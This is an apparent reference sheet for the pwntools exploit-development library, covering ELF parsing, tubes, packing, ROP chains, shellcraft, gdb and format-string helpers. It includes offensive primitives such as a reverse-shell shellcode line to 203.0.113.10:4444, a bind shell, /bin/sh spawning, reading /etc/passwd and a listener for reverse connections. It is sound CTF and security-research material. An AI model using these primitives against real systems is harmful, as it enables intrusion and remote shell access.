# pwntools full reference

## context

```python
context.binary = ELF("./target")   # arch, bits, endian, os derived from the ELF
context.arch = "amd64"             # amd64 | i386 | arm | aarch64 | mips | ...
context.bits = 64                  # usually implied by arch
context.endian = "little"
context.os = "linux"
context.log_level = "debug"        # debug | info | warning | error
context.log_file = "io.log"        # transcript of all tube traffic (evidence!)
context.terminal = ["tmux", "splitw", "-h"]   # for gdb.attach windows
context.timeout = 5                # default tube timeout
context.aslr = False               # disable ASLR for local process()/gdb.debug()
context.bytes                      # word size in bytes (8 on amd64)
with context.local(log_level="error"): ...    # temporary override
```

`args`: any `UPPERCASE` or `KEY=VALUE` word in argv is stripped and exposed as
`args.UPPERCASE` / `args.KEY` (strings; empty string when absent, so truthiness
works: `if args.REMOTE:`).

## ELF

```python
elf = ELF("./target")              # prints checksec on load
elf.checksec()                     # RELRO / Canary / NX / PIE / RPATH summary
elf.arch, elf.bits, elf.entry, elf.statically_linked, elf.pie
elf.path                           # resolved absolute path

elf.symbols["main"]                # dict of all symbols (incl. plt_/got_ prefixed)
elf.functions["main"].address      # Function objects with .address/.size
elf.got["puts"]                    # GOT slot address
elf.plt["puts"]                    # PLT stub address
elf.bss(0x100)                     # .bss base + 0x100 (scratch space)
elf.libc                           # ELF of the libc the loader would use (local)

elf.search(b"/bin/sh")             # generator of vaddrs containing the bytes
next(elf.search(b"/bin/sh"))
next(elf.search(asm("pop rdi; ret"), executable=True))   # inline gadget search
elf.read(addr, n); elf.write(addr, data); elf.save("./patched")  # static patching
elf.disasm(elf.symbols["main"], 64)                      # disassembly string

elf.address = 0                    # default base; symbols are file offsets for PIE
elf.address = leak - elf.symbols["main"]   # rebase once; everything updates
```

Mitigation → technique map:
- NX enabled → ROP (`rop-chains` skill); NX disabled → shellcraft on the stack.
- PIE → need a code-pointer leak before `elf.plt/got/symbols` are usable.
- Full RELRO → GOT not writable (no GOT-overwrite, no ret2dlresolve); Partial
  RELRO/No RELRO → both available.
- Canary → leak it (fmtstr / out-of-bounds read) or avoid SBP overwrite.

## Tubes

```python
p = process("./target")
p = process(["./target", "arg1"], env={"LD_PRELOAD": "./libc.so.6"}, cwd="/tmp")
p = process("./target", stdin=PTY, stdout=PTY)      # PTY-only binaries
p = remote("203.0.113.10", 1337)
p = remote("example.com", 443, ssl=True)
l = listen(4444); l.wait_for_connection()           # catch reverse connections

s = ssh(host="192.0.2.5", user="ctf", keyfile="~/.ssh/id_ed25519")
s = ssh(host="192.0.2.5", user="ctf", password="ctf", port=2222)
p = s.process("./target", cwd="/opt/app")
s.download("/opt/app/libc.so.6"); s.upload("./exploit")
s["id"]                                             # run a command, get output
p = s.remote("127.0.0.1", 9000)                     # TCP via the SSH tunnel

p.pid                                               # local process pid
p.libs()                                            # mapped libraries -> base addrs
p.libc                                              # ELF with .address already set!
p.corefile                                          # Corefile after a crash
p.poll(); p.wait()                                  # exit status
p.close(); p.shutdown("send")
```

Corefile object: `core.eip/rip/esp/rsp/rbp`, `core.registers`,
`core.read(addr, n)`, `core.fault_addr`, `core.stack`, `core.maps`.

## Receiving / sending

See `tubes-io.md` for patterns. API surface:

```python
p.recv(n=4096, timeout=default)      # up to n bytes
p.recvn(n)                           # exactly n bytes (blocks)
p.recvline(keepends=True)
p.recvlines(3)
p.recvuntil(b"delim", drop=False)    # drop=True strips the delimiter
p.recvall(timeout=...)               # until EOF
p.recvregex(rb"0x[0-9a-f]+", capture=False)   # capture=True -> Match object
p.recvpred(lambda d: b"}" in d)
p.clean(timeout=0.05)                # drain and return buffered bytes
p.unrecv(data)                       # push bytes back

p.send(data); p.sendline(data)
p.sendafter(delim, data); p.sendlineafter(delim, data)
p.sendlinethen(delim, data)          # sendline, then recvuntil(delim)
p.interactive()                      # bridge the tube to the operator's terminal
p.stream()                           # dump output until EOF
p.spawn_process("/bin/sh")           # on ssh tubes
```

All recv* raise `EOFError` on closed tube; `timeout=` returns `b""` instead of
raising on expiry.

## Packing and payload layout

```python
p8(x), p16(x), p32(x), p64(x)        # pack; signed=True, endian="big" kwargs
u8(b), u16(b), u32(b), u64(b)        # unpack (exact length required)
pack(x), unpack(b)                   # context-sized
u64(leak.ljust(8, b"\x00"))          # pad short leaks (puts/printf stop at NUL)

flat([a, b, c])                      # concat, packing ints per context
flat({0: b"A"*8, 64: p64(canary), 72: chain}, filler=b"\x90")
fit(...)                             # alias of flat with dict support
cyclic(200, n=4)                     # de Bruijn; n = subsequence length
cyclic_find(0x6161616c)              # int, bytes, or str accepted
cyclic_find(b"laaa")
cyclic_metasploit(200); cyclic_metasploit_find(...)
```

## ROP class

```python
rop = ROP(elf)                       # or ROP([elf, libc]) after rebasing
rop = ROP(libc)                      # second stage from libc gadgets

rop.call("system", [addr])           # by PLT/symbol name
rop.call(libc.symbols["execve"], [binsh, 0, 0])
rop.puts(elf.got["puts"])            # any resolvable function is a method
rop.read(0, elf.bss(0x100), 0x100)   # syscall-style wrappers if symbols exist
rop.raw(0x401234)                    # push a raw word
rop.raw(b"AAAAAAAA")
rop.find_gadget(["pop rdi", "ret"])  # -> Gadget; [0] is the address; None if absent
rop.ret                              # shorthand gadget attributes: .ret .rdi .rsi ...
rop.migrate(new_stack_addr)          # emit a pivot (leave;ret / pop rsp)
rop.ret2dlresolve(dlresolve)         # see `rop-chains` skill
rop.chain()                          # bytes of the chain
rop.dump()                           # annotated listing — review every chain
rop.build(base=addr)                 # resolve chain as if it sits at addr (pivots)
```

If `find_gadget` misses a gadget pwntools can't see (e.g. misaligned bytes), hunt
with ROPgadget/ropper (`rop-chains` skill) and `rop.raw()` the address.

## shellcraft / asm

```python
asm("mov rax, 60; xor rdi, rdi; syscall")       # assemble for context.arch
asm(shellcraft.sh())                             # execve("/bin/sh", ["sh"], 0)
asm(shellcraft.amd64.linux.sh())                 # explicit tree: shellcraft.<arch>.<os>
asm(shellcraft.i386.linux.sh())
asm(shellcraft.execve("/bin/sh", ["sh", "-c", "id"], {"PATH": "/bin"}))
asm(shellcraft.cat("/etc/passwd"))               # open+sendfile to stdout
asm(shellcraft.cat2("/flag"))                    # open/read/write variant
asm(shellcraft.connect("203.0.113.10", 4444) + shellcraft.dupsh())   # reverse shell
asm(shellcraft.bindsh(4444))                     # bind shell
asm(shellcraft.mmap_rwx() )                      # staging helpers
asm(shellcraft.nop()) ; asm(shellcraft.infloop())
asm(shellcraft.pushstr("/bin/sh"))               # building blocks compose
asm(shellcraft.setreuid() + shellcraft.sh())     # setuid targets

disasm(b"\x48\x31\xff")                          # bytes -> listing
ELF.from_assembly("nop; ret")                    # test ELF from asm
run_assembly("int3")                             # assemble + run locally
encoders: encode(sc, avoid=b"\x00\n")            # alphanumeric/avoid-chars encoders
constants.SYS_execve                             # arch-correct syscall numbers
constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC
```

## gdb

```python
gdb.attach(p, gdbscript="b *0x401234\nc")        # attach to running tube
gdb.attach(("203.0.113.10", 1337))               # attach to gdbserver
p = gdb.debug("./target", gdbscript="b main\nc") # launch stopped under gdb
p = gdb.debug(["./target"], api=True)            # p.gdb -> Python GDB API object
p.gdb.Breakpoint("*0x401234"); p.gdb.continue_and_wait()
```

`gdb.debug` is the only way to break before `main`/constructors. Under PIE use
`$rebase(0xoffset)` (pwndbg/gef) in gdbscript. Deep debugging methodology:
`gdb-debugging` skill.

## Format strings

```python
fmtstr_payload(offset, {got_addr: value}, numbwritten=0, write_size="byte")
fs = FmtStr(execute_fmt=send_and_recv_func)      # auto-finds offset
fs.offset; fs.write(got_addr, value); fs.execute_writes()
```

Full technique: `format-string-exploitation` skill.

## Misc utilities

```python
log.info/success/failure/warning("...")
prog = log.progress("stage"); prog.status("leaking"); prog.success("done")
xor(b"data", b"key"); b64e(...); b64d(...); md5sumhex(...); sha256sumhex(...)
enhex(b"\x41"); unhex("41")
pause()                      # wait for Enter (manual gdb attach moment)
sleep(1)
atexit.register(...)
checksec("./target")         # standalone
```
